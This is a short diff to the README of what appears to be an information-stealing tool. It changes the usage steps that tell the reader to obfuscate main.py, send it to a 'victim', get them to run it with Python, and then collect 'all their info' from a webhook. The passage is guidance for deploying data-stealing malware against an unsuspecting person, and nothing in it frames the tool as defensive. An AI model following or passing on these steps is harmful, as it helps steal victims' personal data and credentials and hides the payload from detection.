@@ -21,9 +21,9 @@
 
 6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.com/pyd) (Recommended)
 
-7. Send `main.py` to the victim and when they run `main.py`
+7. Send `main.py` to the victim and make them run the file with python. (That's why you need python)
  
-8. Boom! Check your webhook.
+8.  When they run it... BOOM! Check your webhook, you will have all their info.
 
 <a id="features"></a>
 
